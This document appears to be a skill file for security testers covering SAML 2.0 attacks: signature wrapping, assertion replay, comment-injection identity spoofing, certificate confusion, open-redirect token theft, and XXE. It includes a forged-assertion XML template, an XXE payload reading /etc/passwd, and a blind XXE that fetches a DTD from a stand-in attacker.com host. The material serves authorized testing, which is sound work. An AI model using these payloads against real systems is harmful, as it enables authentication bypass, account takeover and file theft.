---
name: saml
description: SAML security testing covering XML signature wrapping, assertion replay, comment injection, and IdP/SP misconfiguration
depends_on: []
---

# SAML

Security testing for SAML 2.0 authentication flows. Focus on XML signature wrapping attacks, assertion replay, XML comment injection for identity spoofing, certificate confusion, IdP/SP trust misconfiguration, and XXE in SAML responses.

## Attack Surface

**SAML Components**
- Identity Provider (IdP): issues assertions, handles authentication
- Service Provider (SP): consumes assertions, creates sessions
- SAML assertions: signed XML containing identity claims
- SAML bindings: HTTP-POST, HTTP-Redirect, Artifact, SOAP

**Endpoints**
- SP login initiation: `/saml/login`, `/sso/saml`
- SP ACS (Assertion Consumer Service): `/saml/acs`, `/saml/callback`, `/saml/consume`
- SP metadata: `/saml/metadata`, `/saml/metadata.xml`
- SP SLO (Single Logout): `/saml/logout`, `/saml/slo`
- IdP SSO endpoint: varies by provider
- IdP metadata: published XML with certificates and endpoints

**SAML Assertions**
- Subject: NameID (user identifier)
- Conditions: NotBefore, NotOnOrAfter, AudienceRestriction
- AuthnStatement: authentication method, session index
- AttributeStatement: roles, groups, email, custom attributes

**XML Processing**
- XML canonicalization (C14N) for signature verification
- XML parsing differences between IdP and SP libraries
- XSLT and XPath in signature references

## High-Value Targets

- ACS endpoint: receives and processes SAML responses
- SP metadata endpoint: reveals certificates, endpoints, supported bindings
- SAML response in POST body: `SAMLResponse` parameter (base64-encoded XML)
- Session management after SAML authentication
- Admin attributes in assertions (role, group membership, permissions)
- Multi-tenant SAML configurations

## Reconnaissance

**Endpoint Discovery**
```
GET /saml/metadata
GET /saml/metadata.xml
GET /saml2/metadata
GET /auth/saml/metadata
GET /sso/metadata
GET /.well-known/saml-metadata
```

SP metadata reveals:
- Entity ID (SP identifier)
- ACS URL and supported bindings
- SP certificate (for encrypted assertions / signed requests)
- NameID format requirements
- Requested attributes

**IdP Information**
- IdP metadata URL (from SP config or documentation)
- IdP certificates for signature verification
- Supported NameID formats
- SSO and SLO endpoint URLs

**Flow Capture**
- Intercept full SAML login flow in proxy
- Decode `SAMLResponse` (base64) and `SAMLRequest` (base64 + optional deflate)
- Note: HTTP-Redirect binding uses URL parameters; HTTP-POST uses form fields

## Key Vulnerabilities

### XML Signature Wrapping (XSW)

**Attack Mechanism**
- SAML response contains signed assertion; SP verifies signature then extracts identity
- XSW moves the signed assertion to a non-processed location and inserts a forged assertion where the SP extracts data
- Signature remains valid (over the original assertion) but SP processes the forged one

**XSW Variants**
```xml
<!-- XSW1: Move signed Response, add forged Response wrapper -->
<Response>
  <Assertion>FORGED (admin@target.com)</Assertion>
  <Signature>
    <Reference URI="#original"/>
  </Signature>
  <Response ID="original">
    <Assertion>SIGNED (user@target.com)</Assertion>
  </Response>
</Response>

<!-- XSW2: Detach signature from assertion -->
<!-- XSW3-8: Various placement strategies for forged elements -->
```

**Testing**
- Use tools: SAMLRaider (Burp extension), SAML-attacks toolkit
- For each XSW variant (1-8): insert forged NameID, submit to ACS endpoint
- If SP creates session with forged identity: signature verification is vulnerable

### Assertion Replay

**Replay Attack**
- Capture valid SAML response from legitimate login
- Resubmit the same response to ACS endpoint later

**Conditions to Check**
- `NotOnOrAfter`: is the time window enforced? (commonly 5-15 minutes)
- `NotBefore`: is this validated?
- `InResponseTo`: does the SP verify this matches an outstanding AuthnRequest?
- Assertion ID tracking: does the SP reject previously seen assertion IDs?

**Clock Skew Exploitation**
- SPs often allow 2-5 minute clock skew
- Replay within skew window even if `NotOnOrAfter` is technically enforced

### XML Comment Injection

**Identity Spoofing via Comments**
```xml
<NameID>user@target.com<!-- -->.attacker.com</NameID>
```
- Some XML libraries strip comments before string extraction: result is `user@target.com.attacker.com`
- Other libraries ignore comments during extraction: result is `user@target.com`
- If IdP sees one value and SP sees another: identity mismatch enables impersonation

**Variations**
```xml
<NameID>admin<!-- comment -->@target.com</NameID>
<NameID>admin@target.com<!-- -->suffix</NameID>
```
Test with comments at various positions in NameID, attribute values, and audience restrictions.

### Certificate Confusion

**Self-Signed Certificate Attack**
- SP accepts assertions signed with any certificate (no certificate pinning)
- Attacker signs forged assertion with their own key pair
- SP verifies signature is valid but does not check the signing certificate against trusted IdP cert

**Certificate Rollover Abuse**
- During IdP certificate rotation, SP may temporarily accept both old and new certificates
- Attacker uses old (potentially compromised) certificate to sign forged assertions

**Metadata Certificate Injection**
- If SP fetches IdP metadata dynamically over HTTP (not HTTPS): MITM to inject attacker certificate
- SP auto-updates trusted certificate to attacker's key

### IdP/SP Misconfiguration

**Missing Audience Restriction**
- `AudienceRestriction` not checked: assertion for SP-A accepted by SP-B
- Cross-tenant assertion forwarding: capture assertion from one SP, submit to another

**NameID Format Mismatch**
- IdP sends `emailAddress` format; SP uses `unspecified` and accepts any string
- Attacker controls NameID value through IdP with weak input validation

**Unsigned Assertions**
- SP accepts unsigned assertions (only response signed, not assertion)
- Attacker modifies assertion contents within a signed response envelope

**Unsigned Requests**
- AuthnRequest not signed: attacker can initiate SAML flow with arbitrary parameters
- ACS URL manipulation in unsigned AuthnRequest redirecting assertion delivery

### XXE in SAML Responses

**External Entity Injection**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<samlp:Response>
  <Assertion>
    <Subject>
      <NameID>&xxe;</NameID>
    </Subject>
  </Assertion>
</samlp:Response>
```

**Blind XXE**
```xml
<!DOCTYPE foo [
  <!ENTITY % ext SYSTEM "http://attacker.com/xxe.dtd">
  %ext;
]>
```
- SP XML parser processes DTD and external entities
- File read, SSRF, or denial of service depending on parser configuration

### Session Handling After SAML

**Session Fixation**
- SP session created before SAML authentication and reused after
- Attacker sets session cookie, victim authenticates, attacker uses same session

**Logout Issues**
- SLO (Single Logout) not implemented: session persists after IdP logout
- SP-initiated logout doesn't propagate to IdP: other SPs remain authenticated
- Session timeout longer than assertion validity: stale session active after assertion expires

## Bypass Techniques

- Base64 encoding variations: standard vs URL-safe, with/without padding
- XML canonicalization differences: inclusive vs exclusive C14N, with/without comments
- Namespace manipulation: adding or reordering namespaces to break signature without detection
- Encoding the SAMLResponse in chunks or with whitespace variations
- Submitting response via different binding than expected (POST vs Redirect)
- RelayState manipulation for open redirect after authentication

## Testing Methodology

1. **Metadata analysis** - Fetch SP and IdP metadata; map certificates, endpoints, supported features
2. **Flow capture** - Intercept and decode full SAML request/response in proxy
3. **Signature wrapping** - Test XSW variants 1-8 using SAMLRaider or manual XML manipulation
4. **Assertion replay** - Resubmit captured response after expiry; test clock skew tolerance
5. **Comment injection** - Insert XML comments in NameID and attribute values
6. **Certificate validation** - Sign forged assertion with self-signed cert; test if SP accepts it
7. **XXE testing** - Inject DTD and external entities in SAML response XML
8. **Condition validation** - Remove or modify NotOnOrAfter, AudienceRestriction, InResponseTo

## Validation

1. Signature wrapping: forged NameID accepted by SP, session created for attacker-chosen identity
2. Assertion replay: previously captured SAML response accepted and new session created
3. Comment injection: SP extracts different identity than IdP intended from same assertion
4. Certificate confusion: assertion signed with attacker's certificate accepted by SP
5. XXE: file contents exfiltrated or OAST callback received from SP XML parser
6. Missing audience check: assertion for SP-A accepted by SP-B

## False Positives

- SP correctly validates signature reference URI, rejects all XSW variants
- Assertion ID replay cache enforced with proper TTL
- XML parser configured to disable DTD processing and external entities
- Certificate pinned to specific IdP public key, not just any valid signature
- Comment-aware NameID extraction (full string including surrounding text)

## Impact

- Authentication bypass: impersonate any user including administrators
- Account takeover: create sessions as arbitrary users via forged assertions
- Cross-tenant access: assertions accepted across service provider boundaries
- Information disclosure: XXE-based file read or SSRF from SP server
- Persistent backdoor: replayed assertions grant repeated access without re-authentication

## Corpus-Derived Attack Patterns

### RelayState Open Redirect to OAuth Token Theft
Always chain open redirects with OAuth/SAML. Find any open redirect, even one stored in a cookie via SAML RelayState. Then chain: (1) attacker crafts SAML AuthnRequest with malicious RelayState, (2) victim authenticates at IdP, (3) SP processes assertion and redirects to attacker-controlled URL via RelayState, (4) if tokens or session cookies are appended to the redirect, attacker captures them.

### IdP Trust Asymmetry Hunting
For every SSO option offered by a target, identify the IdP's email verification model. If the IdP allows arbitrary email signup without verification (or verification can be bypassed), an attacker can create an IdP account with the victim's email and then SSO into the SP as that identity. Test each IdP (Salesforce, Okta, Azure AD, custom SAML) for email claim trust without verification.

### State-Machine Adversarial-Order Testing
For every multi-step flow (signup, email change, password change, payment update, delete account, SAML binding): (1) map all steps and their sequence, (2) test every non-canonical ordering (skip steps, repeat steps, interleave with other flows), (3) test step substitution (replace step 2's request with a modified step 1). SAML binding flows are especially vulnerable when the SP expects a fixed sequence but does not enforce it.

### API-vs-UI Inconsistency on SAML-Protected Resources
Whenever a UI hides a feature based on permission tier, test whether the API enforces the same restriction. SAML assertions may grant access to a tier, but the UI hides actions the tier should not perform. Directly call the API with the SAML-derived session to test server-side enforcement independent of client-side gating.

### Permission-Matrix Differential Testing for SAML Roles
For any product with granular role-based permissions conveyed via SAML attributes, build a 2-D matrix: rows = roles/permissions, columns = sensitive actions (enforce SSO, convert auth mode, delete org, export data). Execute each action as each role. Focus on actions that toggle authentication mode or SSO enforcement, as these should require the highest permission tier.

### Multi-Frame Protocol Assertion Delivery Abuse
For SAML over HTTP-POST binding where the assertion is delivered via auto-submitting form: test whether the SP validates that the assertion arrives as a single complete POST, or whether partial/chunked delivery can desync the assertion parser. Also test whether the SP accepts assertions delivered via alternative content types or encodings not specified in its metadata.

### Cross-SP Assertion Forwarding in Multi-Tenant Environments
In environments with multiple SPs sharing the same IdP: capture a valid SAML assertion intended for SP-A, base64-decode it, and resubmit it to SP-B's ACS endpoint. If SP-B does not validate `AudienceRestriction` or `Recipient`, the assertion grants access to SP-B. Enumerate all SPs in the same IdP trust domain for cross-SP forwarding.

### Exotic Client Surface SAML Bypass
Map all clients/endpoints associated with a target: web admin, mobile API, WeChat/LINE mini-programs, Slack integrations, embedded widgets. Test SAML-protected features from each client surface separately. Exotic clients (mini-programs, chatbot integrations) often have separate auth paths that bypass SAML enforcement on the main web application.

## Pro Tips

1. Always decode and inspect the full SAML response XML; small differences matter enormously
2. SAMLRaider (Burp) automates XSW variants but manual testing catches implementation-specific issues
3. Test both IdP-initiated and SP-initiated flows; they may have different validation paths
4. Check if the SP validates the entire certificate chain or just the signature
5. Time-based conditions are often loosely enforced; test replays within 1, 5, 15, and 60 minutes
6. Multi-tenant environments are highest risk: assertions may cross tenant boundaries
7. Look for debug/test SAML endpoints that accept unsigned or unencrypted assertions
8. Check if disabling JavaScript affects assertion processing (some SPAs process SAML client-side)
9. Always re-test fixed SAML bugs; fixes for one XSW variant often leave other variants exploitable
10. Internal-tooling surfaces (corp domains, employee dashboards, admin portals) frequently have weaker SAML validation and pay at premium tiers

## Summary

SAML security relies on correct XML signature verification, assertion freshness checks, audience restriction, and certificate pinning. Each missing validation enables a distinct attack from identity spoofing to full authentication bypass.
